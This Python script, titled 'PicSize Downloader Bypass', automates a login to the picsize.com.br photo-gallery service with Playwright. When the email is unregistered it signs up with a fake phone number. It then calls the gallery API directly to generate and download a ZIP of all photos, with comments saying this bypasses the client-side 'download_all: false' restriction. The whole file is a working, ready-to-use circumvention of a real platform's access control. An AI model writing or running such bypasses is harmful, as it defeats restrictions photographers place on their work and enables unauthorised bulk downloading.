import asyncio
import json
import os
import time
import requests
from playwright.async_api import async_playwright

# Configuration
GALLERY_URL = "https://yourdomain.picsize.com.br/galleryHash"
EMAIL = "your@email.com"
PASSWORD = "your_password"
OUTPUT_DIR = "downloads"

# Ensure output directory exists
if not os.path.exists(OUTPUT_DIR):
    os.makedirs(OUTPUT_DIR)


async def login_and_get_zip_url(gallery_url, email, password):
    """
    Uses Playwright to:
    1. Navigate to the gallery and login (or signup if needed)
    2. Trigger ZIP generation via fetch() from the authenticated browser context
    3. Poll until the ZIP is ready
    4. Return the direct download URL (no auth needed)

    The HttpOnly 'customer-client-auth-token' cookie is never extracted —
    instead, we make authenticated API calls directly from the browser
    using fetch() with credentials: 'include'.
    """
    parts = gallery_url.rstrip("/").rsplit("/", 1)
    gallery_hash = parts[1]

    print(f"[1/4] Launching browser...")
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context()
        page = await context.new_page()

        # Step 1: Navigate to gallery home (sets initial cookies)
        home_url = gallery_url
        print(f"[1/4] Navigating to {home_url}")
        await page.goto(home_url)
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)

        # Step 2: Login
        login_url = f"{home_url}/login?callback=select_mode"
        print(f"[1/4] Navigating to login page...")
        await page.goto(login_url)
        await page.wait_for_load_state("networkidle")
        await asyncio.sleep(2)

        if "/login" in page.url:
            print(f"[1/4] Filling login credentials...")
            await page.locator('input[type="text"]').fill(email)
            await page.locator('input[type="password"]').fill(password)

            # Click the form's submit button (not the nav bar one)
            submit = page.locator('button:has-text("Entrar")').last
            await submit.click()
            await asyncio.sleep(3)

            # Check if email is not registered
            not_registered = await page.locator("text=não está cadastrado").count()
            if not_registered > 0:
                print(f"[1/4] Email not registered. Signing up...")
                await page.evaluate("""() => {
                    const link = Array.from(document.querySelectorAll('a'))
                        .find(a => a.textContent.trim() === 'cadastrá-lo');
                    if (link) link.click();
                }""")
                await asyncio.sleep(2)

                # Fill signup form
                textboxes = page.locator('input[type="text"]')
                await textboxes.nth(0).fill(email.split("@")[0])
                await textboxes.nth(1).fill(email)
                await textboxes.nth(2).fill("11999999999")
                await page.locator('input[type="password"]').fill(password)
                await page.locator('button:has-text("Cadastrar")').click()
                await asyncio.sleep(4)

                # After signup, go back to login
                await page.goto(login_url)
                await page.wait_for_load_state("networkidle")
                await asyncio.sleep(2)

                if "/login" in page.url:
                    print(f"[1/4] Logging in after signup...")
                    await page.locator('input[type="text"]').fill(email)
                    await page.locator('input[type="password"]').fill(password)
                    await page.locator('button:has-text("Entrar")').last.click()
                    await asyncio.sleep(3)

            # Wait for redirect chain to complete
            # login page -> gallery home -> selecao.picsize.com.br
            await page.wait_for_load_state("networkidle")
            await asyncio.sleep(5)

        print(f"[1/4] Logged in. Current URL: {page.url}")

        # Step 3: Trigger ZIP generation from the browser context
        # The browser has the HttpOnly auth cookie set, so fetch() with
        # credentials: 'include' will send it automatically.
        # This bypasses the client-side 'download_all: false' check.
        print(f"[2/4] Triggering ZIP generation (bypass)...")
        generate_result = await page.evaluate("""async (hash) => {
            try {
                const r = await fetch(
                    `https://gallery-api.s2.picsize.com.br/gallery/${hash}/zip?generate=true`,
                    {
                        credentials: 'include',
                        headers: {
                            'Origin': 'https://selecao.picsize.com.br',
                            'Referer': 'https://selecao.picsize.com.br/'
                        }
                    }
                );
                return { status: r.status, body: await r.text() };
            } catch(e) {
                return { error: e.message };
            }
        }""", gallery_hash)

        if generate_result.get("error"):
            print(f"[2/4] ERROR: {generate_result['error']}")
            await browser.close()
            return None, gallery_hash

        gen_data = json.loads(generate_result["body"])
        if not gen_data.get("success"):
            print(f"[2/4] ERROR: {gen_data}")
            await browser.close()
            return None, gallery_hash

        count = gen_data.get("zip_files_count", 0)
        size_mb = gen_data.get("zip_size", 0) / (1024 * 1024)
        print(f"[2/4] ZIP generation started: {count} photos, ~{size_mb:.2f} MB")

        # Step 4: Poll until ZIP is ready
        print(f"[3/4] Waiting for server to finish compression...")
        zip_url = None
        for _ in range(60):
            poll_result = await page.evaluate("""async (hash) => {
                try {
                    const r = await fetch(
                        `https://gallery-api.s2.picsize.com.br/gallery/${hash}/zip`,
                        {
                            credentials: 'include',
                            headers: {
                                'Origin': 'https://selecao.picsize.com.br',
                                'Referer': 'https://selecao.picsize.com.br/'
                            }
                        }
                    );
                    return { status: r.status, body: await r.text() };
                } catch(e) {
                    return { error: e.message };
                }
            }""", gallery_hash)

            if poll_result.get("error"):
                print(f"[3/4] ERROR: {poll_result['error']}")
                break

            poll_data = json.loads(poll_result["body"])
            status = poll_data.get("zip_status")

            if status == "complete":
                zip_url = poll_data.get("zip_url")
                count = poll_data.get("zip_files_count", 0)
                size_mb = poll_data.get("zip_size", 0) / (1024 * 1024)
                print(f"[3/4] ZIP ready! {count} photos, {size_mb:.2f} MB")
                break

            if status in ("invalid", None):
                print(f"[3/4] ERROR: ZIP generation failed (status: {status})")
                break

            print(f"[3/4] Status: {status} - waiting 5s...")
            await asyncio.sleep(5)

        await browser.close()
        return zip_url, gallery_hash


def download_zip(zip_url, gallery_hash):
    """
    Downloads the ZIP file from Backblaze cloud storage.
    No authentication is needed for this step.
    """
    filepath = os.path.join(OUTPUT_DIR, f"{gallery_hash}.zip")

    if os.path.exists(filepath):
        print(f"[4/4] File already exists: {filepath}")
        return filepath

    print(f"[4/4] Downloading ZIP...")

    with requests.get(zip_url, stream=True) as r:
        r.raise_for_status()
        total = int(r.headers.get("content-length", 0))
        downloaded = 0

        with open(filepath, "wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
                    downloaded += len(chunk)
                    if total:
                        pct = (downloaded / total) * 100
                        print(
                            f"\r[4/4] Progress: {pct:.1f}% ({downloaded // 1024} KB / {total // 1024} KB)",
                            end="",
                            flush=True,
                        )

    print(f"\n[4/4] Saved to {filepath}")
    return filepath


async def main():
    print("=" * 50)
    print("  PicSize Downloader Bypass")
    print("=" * 50)
    print(f"Target: {GALLERY_URL}\n")

    # Steps 1-3: Login + trigger ZIP + poll (all via Playwright)
    zip_url, gallery_hash = await login_and_get_zip_url(GALLERY_URL, EMAIL, PASSWORD)

    if not zip_url:
        print("\nFailed to generate ZIP. Exiting.")
        return

    # Step 4: Download the ZIP (direct from cloud, no auth needed)
    download_zip(zip_url, gallery_hash)

    print("\nAll done!")


if __name__ == "__main__":
    asyncio.run(main())
